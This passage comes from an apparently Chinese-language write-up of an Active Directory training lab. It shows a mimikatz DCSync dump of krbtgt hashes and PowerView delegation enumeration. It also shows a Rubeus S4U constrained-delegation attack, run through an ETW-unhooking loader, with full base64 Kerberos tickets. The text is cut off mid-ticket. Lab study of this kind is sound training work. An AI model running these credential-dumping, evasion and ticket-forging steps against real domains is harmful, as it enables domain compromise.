&gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;moneycorp.local&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;mcorp-dc.moneycorp.local&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;mcorp\krbtgt&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00000202</span> ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">11</span>/<span class="number">11</span>/<span class="number">2022</span> <span class="number">10</span>:<span class="number">46</span>:<span class="number">24</span> PM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-335606122-960912869-3279953914-502</span></span><br><span class="line">Object Relative ID   : <span class="number">502</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: a0981492d5dfab1ae0b97b51ea895ddf</span><br><span class="line">    ntlm- <span class="number">0</span>: a0981492d5dfab1ae0b97b51ea895ddf</span><br><span class="line">    lm  - <span class="number">0</span>: <span class="number">87836055143</span>ad5a507de2aaeb9000361</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">7</span>c7a5135513110d108390ee6c322423f</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer-Keys</span> *</span><br><span class="line">    Default Salt : MONEYCORP.LOCALkrbtgt</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">90</span>ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">801</span>bb69b81ef9283f280b97383288442</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : c20dc80d51f7abd9</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : MONEYCORP.LOCALkrbtgt</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : c20dc80d51f7abd9</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:WDigest *</span><br><span class="line">    <span class="number">01</span>  <span class="number">49</span>fec950691bbeba1b0d33d5a48d0293</span><br><span class="line">    <span class="number">02</span>  <span class="number">0</span>b0c4dbc527ee3154877e070d043cd0d</span><br><span class="line">    <span class="number">03</span>  <span class="number">987346</span>e7f810d2b616da385b0c2549ec</span><br><span class="line">    <span class="number">04</span>  <span class="number">49</span>fec950691bbeba1b0d33d5a48d0293</span><br><span class="line">    <span class="number">05</span>  <span class="number">0</span>b0c4dbc527ee3154877e070d043cd0d</span><br><span class="line">    <span class="number">06</span>  <span class="number">333</span>eda93ecfba8d60c57be7f59b14c62</span><br><span class="line">    <span class="number">07</span>  <span class="number">49</span>fec950691bbeba1b0d33d5a48d0293</span><br><span class="line">    <span class="number">08</span>  cdf2b153a374773dc94ee74d14610428</span><br><span class="line">    <span class="number">09</span>  cdf2b153a374773dc94ee74d14610428</span><br><span class="line">    <span class="number">10</span>  a6687f8a2a0a6dfd7c054d63c0568e61</span><br><span class="line">    <span class="number">11</span>  <span class="number">3</span>cf736e35d2a54f1b0c3345005d3f962</span><br><span class="line">    <span class="number">12</span>  cdf2b153a374773dc94ee74d14610428</span><br><span class="line">    <span class="number">13</span>  <span class="number">50</span>f935f7e1b88f89fba60ed23c8d115c</span><br><span class="line">    <span class="number">14</span>  <span class="number">3</span>cf736e35d2a54f1b0c3345005d3f962</span><br><span class="line">    <span class="number">15</span>  <span class="number">06</span>c616b2109569ddd69c8fc00c6a413c</span><br><span class="line">    <span class="number">16</span>  <span class="number">06</span>c616b2109569ddd69c8fc00c6a413c</span><br><span class="line">    <span class="number">17</span>  <span class="number">179</span>b9c2fd5a34cbb6013df534bf05726</span><br><span class="line">    <span class="number">18</span>  <span class="number">5</span>f217f838649436f34bbf13ccb127f44</span><br><span class="line">    <span class="number">19</span>  <span class="number">3564</span>c9de46ad690b83268cde43c21854</span><br><span class="line">    <span class="number">20</span>  <span class="number">1</span>caa9da91c85a1e176fb85cdefc57587</span><br><span class="line">    <span class="number">21</span>  <span class="number">27</span>b7de3c5a16e7629659152656022831</span><br><span class="line">    <span class="number">22</span>  <span class="number">27</span>b7de3c5a16e7629659152656022831</span><br><span class="line">    <span class="number">23</span>  <span class="number">65</span>f5f95db76e43bd6c4ad216b7577604</span><br><span class="line">    <span class="number">24</span>  <span class="number">026</span>c59a45699b631621233cb38733174</span><br><span class="line">    <span class="number">25</span>  <span class="number">026</span>c59a45699b631621233cb38733174</span><br><span class="line">    <span class="number">26</span>  <span class="number">342</span>a52ec1d3b39d90af55460bcda72e8</span><br><span class="line">    <span class="number">27</span>  ef1e1a688748f79d16e8e32318f51465</span><br><span class="line">    <span class="number">28</span>  <span class="number">9</span>e93ee8e0bcccb1451face3dba22cc69</span><br><span class="line">    <span class="number">29</span>  <span class="number">480</span>da975c1dfc76717a63edc6bb29d7b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>

<p>这里flag为 一开始打印机漏洞的目标，即<code>dollarcorp.moneycorp.local</code> 的域控 <code>dcorp-dc$</code></p>
<h2 id="Learning-Objective-16-1"><a href="#Learning-Objective-16-1" class="headerlink" title="Learning Objective - 16 - 1"></a>Learning Objective - 16 - 1</h2><blockquote>
<p>Value of msds-allowedtodelegate to attribute of dcorp-adminsrv	</p>
</blockquote>
<blockquote>
<p>dcorp-adminsrv的msds-allowedtodelegate属性的值</p>
</blockquote>
<p>这里是个非约束委派，虽然他flag是要直接看<code>dcorp-adminsrv</code>的可委派目标就行</p>
<p>不过还是正常走流程看下域内所有的约束委派。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt; <span class="built_in">Get-DomainObject</span> |?&#123;<span class="variable">$_</span>.<span class="string">&quot;msds-allowedtodelegateto&quot;</span> <span class="operator">-ne</span> <span class="variable">$null</span>&#125;|<span class="built_in">select</span> name,msds<span class="literal">-allowedtodelegateto</span></span><br><span class="line"></span><br><span class="line">name           msds<span class="literal">-allowedtodelegateto</span></span><br><span class="line"><span class="literal">----</span>           <span class="literal">------------------------</span></span><br><span class="line">DCORP<span class="literal">-ADMINSRV</span> &#123;TIME/dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.LOCAL, TIME/dcorp<span class="literal">-DC</span>&#125;</span><br><span class="line">web svc        &#123;CIFS/dcorp<span class="literal">-mssql</span>.dollarcorp.moneycorp.LOCAL, CIFS/dcorp<span class="literal">-mssql</span>&#125;</span><br></pre></td></tr></table></figure>

<p>flag是 <code>&#123;TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC&#125;</code></p>
<h2 id="Learning-Objective-16-2"><a href="#Learning-Objective-16-2" class="headerlink" title="Learning Objective - 16 - 2"></a>Learning Objective - 16 - 2</h2><blockquote>
<p>Alternate service accessed on dcorp-dc by abusing Constrained delegation on dcorp-adminsrv</p>
</blockquote>
<blockquote>
<p>通过滥用 dcorp-adminsrv 上的约束，在 dcorp-dc 上（通过篡改服务名）访问其他服务。</p>
</blockquote>
<p>既然 <code>dcorp-adminsrv</code> 能委派到 <code>dcorp-dc</code> 那就滥用一下。</p>
<p>虽然他只能委派到dc的 <code>time</code> 服务，但因为在 <code>s4u2self</code> 返回来的TGS票据中，服务器名是加密的，但服务名不验证，篡改成 <code>cifs</code> 或者别的只要dc的spn中有的服务都可以。</p>
<p>约束委派需要这个服务端的凭证才可以搞伪造，所以先拿一下 <code>DCORP-ADMINSRV</code> 的凭据</p>
<p>由于 <code>Learning Objective - 7 - 3</code> 拿过了，所以直接拿过来用了</p>
<p><code>e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51</code></p>
<p>然后做s4u，由DCORP-ADMINSRV做s4u2self+s4u2proxy，然后把s4u2proxy回来的tgs票里面的服务名给改成ldap。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; .\Loader.exe <span class="literal">-path</span> .\Rubeus.exe <span class="literal">-args</span> s4u /user:DCORP<span class="literal">-ADMINSRV</span><span class="variable">$</span> /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /msdsspn:TIME/dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.LOCAL /impersonateuser:administrator /altservice:ldap /ptt</span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : .\Rubeus.exe Arguments : s4u /user:DCORP<span class="literal">-ADMINSRV</span><span class="variable">$</span> /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /msdsspn:TIME/dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.LOCAL /impersonateuser:administrator /altservice:ldap /ptt</span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] <span class="keyword">Using</span> aes256_cts_hmac_sha1 hash: e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51</span><br><span class="line">[*] Building AS<span class="literal">-REQ</span> (w/ preauth) <span class="keyword">for</span>: <span class="string">&#x27;dollarcorp.moneycorp.local\DCORP-ADMINSRV$&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: 172.16.2.1:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIGRjCCBkKgAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD</span><br><span class="line">      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOC</span><br><span class="line">      BMQwggTAoAMCARKhAwIBAqKCBLIEggSuL6VoB83leJ/TIIKFo3IERU3q/AoViGxmRoVNflU41vee7bnv</span><br><span class="line">      BIDLlOZMiAQcyF9xgKlGRwy5bDBAMkOR9XYGearwMja1VYA2MPuEPawod1oc9Zo7sIG1riLRzbdVYE/k</span><br><span class="line">      NN0G42UMcqX1YWDVUTLmZ0oYgFDmLKiNLVHJRD91pZNpB2/Dd7GWy+WMSKW4oVbgTWTuAsNLLtThncM3</span><br><span class="line">      Ht3Q/KNtP0IDmgm0VKnql21LW6GWjvfPYnZuKyidk7H7Pvd7gSA9rQDZggVlq8J5BJ+<span class="number">6</span>fXvKxu67U82Z</span><br><span class="line">      WMOHXwfL+CE9RsIsIQLGPmyWtNhu+bRXmNUe5/EAgNoOqYqOaz+NHxeU1kt/NmZFCwx9/BU80UGSKAjs</span><br><span class="line">      DoFp+UjGza6wTtOOYbAk/a1aogLH6N7nASrWektnV5uoQhqXfOLg9GgecQfXR0bCH8ZVqcmO0IE/EZSz</span><br><span class="line">      sCjdwbGX5Q1pwai/w6cxytZ9zrPtrQPzznCNzf7d1MJgzY+Db+oRLjAUkEewKgSCpWjxmHjq/M3AjcG0</span><br><span class="line">      cH5qFhbQjxMkB+BRbE3qTlUGRtrnqzHaupZNmeRx0ZYDhRZ6F9OlioC4v2RYY85e+wh2v1KuSdk6a2Sg</span><br><span class="line">      laMpCd7TtWDwtamwsL+lG738kps/V0Goi9VGfbCnF5xvTSGg+XfCZk42FHfZUNaj9w2HTvnnIW824z4X</span><br><span class="line">      Yk4HBWayWd2EHGO/bMQJdqo74abFSG8qr8ceU/U2WHwF5AztEy/GtHjeKEXRXzDW4Q+ldM20o2Pmlzpd</span><br><span class="line">      aWK7Fz3ed9RDU5SCiKbNTba7HWVbiEtoQJ023H5au+sFwWh9S7VYj+KS5zPqgIJx72DWnPAGHQK6TYBv</span><br><span class="line">      QRZxEqVQmhz0OOamtPmErIaa6LbgDE0EsyQoIuIgSQYYKGbluxMNgDafDgQGNYsdAeGZSVS632TKSs5<span class="built_in">R</span></span><br><span class="line">      sXtBHD681NQw05Xe0NWatCVZBEu4EgYtL9bX0e3vPHD0SK9h3oGaQPDn5nssx1yqrjCq7UtNKNDXOLFj</span><br><span class="line">      a55EtHMDCxzIE0+IqIJXa5zYbub5gauGyrKEIkZKKSAXCI1uQJ50X2PEWjinnf7cknu5ixqLLP3gyjHr</span><br><span class="line">      <span class="number">9</span>buIjSDITcUmVZNENlaO506QErjB5+<span class="number">48</span>PKsZT/Ex5IExvWtbPg6/<span class="number">7</span>/FGimVICQkFxj2LlsmV7bH2E9/x</span><br><span class="line">      aBKnHsW1SWkPoy7BtT+u5j7ePzVRe9PROe8wpFNCgw8CMccaqTF7r7vQUr2QXwG5EFzKTK5YZf7oheKa</span><br><span class="line">      zzkNHcacXSA5vO3IAA5dEBoOTWNGxCaZPMQRbBqEwpxmto57SCDHnMFZ5lWAdb3Um8st46RetlyepDLX</span><br><span class="line">      gWBIdrA/gSLFPDBE9e82ttOtkaEhTnzVm7KkLFRR7kYe/I1+Zw+<span class="number">0</span>wX7+f0Bm27BIlT3+pf9x9GuBgrSO</span><br><span class="line">      pHN3ZljLsQdKlAw/EQRgii9ZxVPsJoAMYScRm5jYYWH4znM+fKSWVuqWDZeK1vTe44BVXfaseV0NBhQw</span><br><span class="line">      B+ZNMyYpsQbaQetx2Trz1an4EcE7ujU3pvj2GX/OY1Zp8cMQ4hZq0sijYPC1CTz28Jgz6GQ+fPJKNvNI</span><br><span class="line">      <span class="number">4</span>lxV+tjXrNts6TuaI3OVheCPzIDSoaOCAQgwggEEoAMCAQCigfwEgfl9gfYwgfOggfAwge0wgeqgGzAZ</span><br><span class="line">      oAMCARehEgQQzcG9<span class="built_in">r</span>/vnf4EiwdKzJhLBj6EcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIcMBqg</span><br><span class="line">      AwIBAaETMBEbD0RDT1JQLUFETUlOU1JWJKMHAwUAQOEAAKURGA8yMDI1MDUyNzExMjY1N1qmERgPMjAy</span><br><span class="line">      NTA1MjcyMTI2NTdapxEYDzIwMjUwNjAzMTEyNjU3WqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NB</span><br><span class="line">      TKkvMC2gAwIBAqEmMCQbBmtyYnRndBsaZG9sbGFyY29ycC5tb25leWNvcnAubG9jYWw=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] Building S4U2self request <span class="keyword">for</span>: <span class="string">&#x27;DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)</span><br><span class="line">[*] Sending S4U2self request to <span class="number">172.16</span>.<span class="number">2.1</span>:<span class="number">88</span></span><br><span class="line">[+] S4U2self success!</span><br><span class="line">[*] Got a TGS <span class="keyword">for</span> <span class="string">&#x27;administrator&#x27;</span> to <span class="string">&#x27;DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL&#x27;</span></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIGWzCCBlegAwIBBaEDAgEWooIFQzCCBT9hggU7MIIFN6ADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD</span><br><span class="line">      T1JQLkxPQ0FMohwwGqADAgEBoRMwERsPRENPUlAtQURNSU5TUlYko4IE8jCCBO6gAwIBEqEDAgEBooIE</span><br><span class="line">      <span class="number">4</span>ASCBNy6QyGRVjdHPFQ7HJi3wQK2hldCs0phqm2++kU05gInYEHE2PIed3T7lit4njDY5NPDGSAcM9JQ</span><br><span class="line">      n4JKgGEIs7+RP5oBgbj44pBgHn3+sR3O8l9HFupZRYKKpbVgabMY3CRyuIDGzwd8ByH7DhS6bj1GwFWM</span><br><span class="line">      wvqJ/CurIZcTL2pyVr4hsNdkAlsmxMgAAxwMKdusSM4y+dS+OvmclviwY3QJH9WtDBVuTcwkrmpFRJQk</span><br><span class="line">      PCiaeUOKc5FkX2CEAPupiv7w5veXTZQqqIM3Qa8DB778M1AncX0KTq0dIOz1HFVnBMxHWSwgEsgzZfnK</span><br><span class="line">      QVmNwZeOnM45zZ06esSf1J0FSFvAsWk/gEizRnSbf+yYF5eBo/MpCn4sUD3NopnbmqSwcUEj2cgKufmh</span><br><span class="line">      CVsqFKim2yEWwHxY259fvffXOMCwVvoVbxjmLlYpz3jqHcxxXtBv0HTKIeA7Y5tf3YJ3mH6B+o6FgT8X</span><br><span class="line">      HQSMgAiiRCmGqg/Os/<span class="number">7</span>gDtD8G50QrKcaGnh1FZIjBN5MX/iWXk3McE6XVXrc3KGfinQyUW4rQjLGt0V5</span><br><span class="line">      xwG46L5Jo2J4sjpns4zQ+BEFqWpHLcJrQ3c2+uf3GcbFLasFKYhSipV8BG8YGXGAP5K7/ppSvy4/z3hh</span><br><span class="line">      DUzKrok2TMBs7LQub6URfz/BiZDo+E6lJyZ0aKIX8X3jQbZ6lziWL3xSresa/c5h9lPPS0YATIYoVhmo</span><br><span class="line">      <span class="number">9</span>yltr0p4fuxzIMkJZfu+EX6xPuk/bXlWqwcXLGOPQ9vNkBxUAFxWWIssKcz84qe1VI1ewEQJMk/vqLdz</span><br><span class="line">      CoHScqNL0XJDf4fHe0RFvZj2/TNfSYvcibGz9SHyBz4uBuj/t5UGlOALBoMjWA5EcWuhUuYdu5U3Trd1</span><br><span class="line">      brNDD+finHiFiBx4Ejp+Hf4iO1vZFqxbshyaJMeERmPeDrFmT4sky9Yu2mqthsw2K35oNkhJLRxxqGzG</span><br><span class="line">      xBxFtD05f78X1mbsPkt6IvkwM5XB0fQnxTCpSTjIyxBxJ1ZMQlY1pTfY6wqi/E7SyCk2QFU33woocfC1</span><br><span class="line">      vuRIlJItjyN+DXFrIlI8upkEFGIGxxPti8ED+odsYKNFFMNZPv7zMGEEfsJ7gaFMwzAqcuEEHMCuryYd</span><br><span class="line">      n/<span class="number">27</span>zEMDSrHx3yiLi4atTJDXu5Cp0VEDuvaSAvV0hLBDA6wG5+<span class="number">5</span>TLc7/i/cmutLWeAJbVSFAW1M2/Iwn</span><br><span class="line">      <span class="number">65</span>rTLZkLpvYhlHhfQlThGROKhPmUko7TWmJwtr+hfZZU5nj97JepDxeWjUG5AiFW3/pQ2PhGQvZKxGpQ</span><br><span class="line">      zqakK0lp9kNMxUGpK43lH1FupF0ybKIds3PbsoDjpkUyQIaB/wqWwmi41/lU/EJDb4lmqwqXpms5h2eE</span><br><span class="line">      bT0cmCS8LlruXmZ45i2g8SDweep+ykd6gbeZSZnrIQbfWuG7D4BzA4faJn/vcBCslmeyB07kYgTK3L0Q</span><br><span class="line">      w3nndmJg418zUTJ6+xzJwgrrQnrFmpcDh7Y3bbpfESghseXNO/Fagha48g67elpzyBFj6CJ31/vp17RR</span><br><span class="line">      /ISj+uGKvfWkX/WxFunBSjpKW3eVUYiOOpj4edsvqUvZmjNQDdSWhASeVCzVZEBV2qQ4FUtvuZ/cTEM9</span><br><span class="line">      WR0lLbWcaLdCnY4V/eRFPSVC/bjUUYw3xOxDhVAKK8KBhKkezqrUAUCjX7JvcOFzOaOCAQIwgf+gAwIB</span><br><span class="line">      AKKB9wSB9H2B8TCB7qCB6zCB6DCB5aArMCmgAwIBEqEiBCCXK6Wa+PyUGqQjHME1RSdCaITrYZVMpmE7</span><br><span class="line">      TFiwcTtUn6EcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIaMBigAwIBCqERMA8bDWFkbWluaXN0</span><br><span class="line">      cmF0b3KjBwMFAEChAAClERgPMjAyNTA1MjcxMTI2NThaphEYDzIwMjUwNTI3MjEyNjU3WqcRGA8yMDI1</span><br><span class="line">      MDYwMzExMjY1N1qoHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypHDAaoAMCAQGhEzARGw9EQ09S</span><br><span class="line">      UC1BRE1JTlNSViQ=</span><br><span class="line"></span><br><span class="line">[*] Impersonating user <span class="string">&#x27;administrator&#x27;</span> to target SPN <span class="string">&#x27;TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL&#x27;</span></span><br><span class="line">[*]   Final ticket will be <span class="keyword">for</span> the alternate service <span class="string">&#x27;ldap&#x27;</span></span><br><span class="line">[*] Building S4U2proxy request <span class="keyword">for</span> service: <span class="string">&#x27;TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)</span><br><span class="line">[*] Sending S4U2proxy request to domain controller <span class="number">172.16</span>.<span class="number">2.1</span>:<span class="number">88</span></span><br><span class="line">[+] S4U2proxy success!</span><br><span class="line">[*] Substituting alternative service name <span class="string">&#x27;ldap&#x27;</span></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi) <span class="keyword">for</span> SPN <span class="string">&#x27;ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL&#x27;</span>:</span><br><span class="line"></span><br><span class="line">      doIHcTCCB22gAwIBBaEDAgEWooIGTTCCBklhggZFMIIGQaADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD</span><br><span class="line">      T1JQLkxPQ0FMojYwNKADAgECoS0wKxsEbGRhcBsjZGNvcnAtZGMuZG9sbGFyY29ycC5tb25leWNvcnAu</span><br><span class="line">      TE9DQUyjggXiMIIF3qADAgESoQMCARKiggXQBIIFzIGIQeQyxgaTZnfuqgC1<span class="built_in">H</span>/<span class="number">3</span>cA2V/Cg8fF4YlhSnm</span><br><span class="line">      dWz02Fq6OYDVuTehNzgmCXR+oYzuepeXENGGwjENbfmF2kpnn/KSmkIg2qCH43Q6MAYSJq+zpZF0gmqm</span><br><span class="line">      ovRl4v/zqow581ekSmcGG64Z1gD9rD59gp4<span class="built_in">Ac</span>/g4QuJc33hmyK4uDuJBFOJ6XIGjiYCzfZWALjRVTbSs</span><br><span class="line">      IjX+/D6kjZCEM6/crP2cr86FuNAYx5niyEFjuOb2wUENzxCqbn7l4lV7lF8iQ38rBtVOb1zMGtQUjKPd</span><br><span class="line">      DfuWmOny3VsYueeDDG+<span class="number">5</span>GZvvAoRe696JF/p5jkYW+RfzEM6WosAtqLzWd0UeLDoIX6UBbl7eP5u9zH7I</span><br><span class="line">      /fBurLkFD+c/ZeaHT7ET5tto7tKb9Ru+<span class="built_in">h</span>+<span class="number">4</span>muJy5nyLJefeu5/hz5N39f5vojWBCO53mjEeyCK7J2gSg</span><br><span class="line">      k3WMkyDqDaJT1B+iy1VweVKUEDaluFEf48vzzPhoQCEbjePrSDAwT8uMuIadZdkMNbBBSTJ2JY/H12Bj</span><br><span class="line">      mCOiAPJcoxzp/lxFB9mipj36y2y475LsD4eJLxs4rIKwzuyOZklqMRRn3gvMH5a21ZjsCzcC+Ti1xaXo</span><br><span class="line">      P9RLNcSyD4djgQPHBNIAcKsVn+Bn3tlN4zIIoGl5uGkJFaetrxSTPR76+<span class="number">8</span>Ggdj7x2RHNgXhbQK0JX1cS</span><br><span class="line">      g/zCnpeZXWi/<span class="number">3</span>A1KIFQ6NxoeqmXGQ3p6PECUFksZ7a1JClGbJRXhpFYQwArCV7gjRcL0QfSlZDatds40</span><br><span class="line">      /gapjgy1nHhopL2hZdGFyVfw1vB5k2UoSEe6vOsbEMYqOtr6ccByhAByqP+v/Qxe+HlpAnOa1OOXu7mm</span><br><span class="line">      LKvBzMvuZ9nuzdMXgu8Csz8yZmlMSxbWGE8YJvUiyPYX9P2H6vBFHo3S1wkaz5Md3KE2ZNJwOxyU2OM4</span><br><span class="line">      FYMStsRiEoyLzw15he/ebFLtwSZnumwR8e7TFa/sDTtjJ3jBm5JwRZ94TVZyEES2NvekIBqcGR5rPgjs</span><br><span class="line">      cVQPOIJwWe72e49Q5h6YXyfT3bGSBbQOEnSAkEjny7/<span class="number">62</span>eQE02s9B+Yylx6uua6+KymWVAj6rISPRnuz</span><br><span class="line">      Tre2aqqBBLetoH5d6fHCCMLOMTyPVMxRA6w/i70rN2atoEa5nzWXGyVvW5I8VmfHg2moFqrjH2g2gut8</span><br><span class="line">      VPk6ClWz49Bu0eyFl+<span class="number">06</span>agu+<span class="number">793</span>sBZiQ3LGc7GsCD4b/PHmgc/eMoraaXpncWKw606wZ5ofTLVlAPaam</span><br><span class="line">      Zg+AAhOnCeozeyQ0CW2Bx7xLbe+B2LTR/<span class="number">8</span>j0ALofIZaCXzZu3J7DJ6HTS0mHDAWx68FHuGsJ/<span class="number">45</span>K4vAd</span><br><span class="line">      O7E/Sk3OabahX1v/rtq/mBlzggO/<span class="number">3</span>Hg3CMfOlrqGUg1lLf0FUwgBdDkh6Yh6GhbVg2z0LHde6p5M0HLz</span><br><span class="line">      <span class="number">6</span>cwIiwf1/Tb5LKbxVeWuGZg2OiGyewjELme23gWBvlcWyywpkeZ1ZB61Oz6UBPoiHMwbdcYMpo22GXbR</span><br><span class="line">      n5rPfRhX9vRFQ6Bt+cm/LVGtWAPAchCqBTlgTqFHrItAmOCyZT49QX8DfeRD4BtFsDidTz6d7THTQCLp</span><br><span class="line">      COaQSf/V/tqN1ZCFU7xzQej5QA/GBmxfDQpm/RCUJNNLDr4cD0XGOqxt6ijsSmaj2tuhYJqsFGAiyzqV</span><br><span class="line">      